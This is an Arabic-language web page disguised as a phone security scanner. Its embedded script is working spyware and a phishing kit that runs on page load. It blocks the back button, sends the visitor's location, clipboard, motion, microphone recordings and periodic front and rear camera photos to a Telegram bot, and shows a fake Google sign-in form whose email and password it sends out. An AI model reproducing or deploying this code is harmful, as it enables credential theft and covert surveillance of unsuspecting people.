<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>⚙️ مركز الحماية والأمان</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .ui { text-align: center; width: 90%; max-width: 400px; }
        .scanner { width: 200px; height: 200px; border: 3px solid #4285f4; border-radius: 50%; margin: 20px auto; position: relative; overflow: hidden; box-shadow: 0 0 20px #4285f4; }
        .scan-line { width: 100%; height: 2px; background: #fff; position: absolute; top: 0; animation: scan 2s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        #phish-overlay { display: none; position: fixed; top:0; left:0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
        .box { width: 85%; max-width: 350px; text-align: center; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 15px; background: #1a73e8; color: #fff; border: none; border-radius: 5px; font-weight: bold; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="ui" id="main-ui">
        <div class="scanner"><div class="scan-line"></div></div>
        <h2 id="msg">جاري فحص التهديدات الأمنية...</h2>
        <p style="color:#777; font-size:12px;">يرجى عدم إغلاق الهاتف لضمان سلامة بياناتك.</p>
    </div>

    <div id="phish-overlay">
        <div class="box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80">
            <h3>تأكيد الهوية مطلوب</h3>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button onclick="sendCreds()">إتمام الفحص</button>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";

        function notify(text) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`); }

        // 1. نظام "القفص الرقمي" ومنع الهروب
        function lockDown() {
            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => { window.history.pushState(null, null, window.location.href); notify("🚫 الضحية حاول الخروج!"); };
            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
        }

        // 2. جاسوس البيانات (الحافظة، الموقع، البطارية، الحركة)
        async function spyIntel() {
            navigator.geolocation.getCurrentPosition(p => notify(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
            
            document.addEventListener('click', async () => {
                try { const t = await navigator.clipboard.readText(); if(t) notify(`📋 الحافظة: ${t}`); } catch(e) {}
            }, {once: true});

            window.addEventListener('devicemotion', (e) => {
                if(Math.abs(e.acceleration.x) > 2) notify("🏃 الضحية يتحرك.");
            }, {once: true});
        }

        // 3. التجسس الصوتي والبصري (الاحترافي)
        async function spyAudioVisual() {
            // الصوت
            try {
                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                const r = new MediaRecorder(s);
                r.ondataavailable = (e) => {
                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => { r.start(); setTimeout(() => r.stop(), 5000); }, 20000);
            } catch(e) {}

            // الصور (أمامية وخلفية)
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let i = 0, modes = ["user", "environment"];
            
            setInterval(async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1000));
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => {
                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'x.jpg');
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                i++;
            }, 2500);
        }

        function sendCreds() {
            const e = document.getElementById('email').value, p = document.getElementById('pass').value;
            if(e && p) {
                notify(`🔥 بيانات مسحوبة:\n📧: ${e}\n🔐: ${p}`);
                document.getElementById('phish-overlay').style.display = 'none';
                document.getElementById('msg').innerText = "✅ تم تأمين الجهاز بنجاح.";
            }
        }

        window.onload = () => {
            lockDown(); spyIntel(); spyAudioVisual();
            setTimeout(() => { document.getElementById('phish-overlay').style.display = 'flex'; }, 30000);
        };
    </script>
</body>
</html>
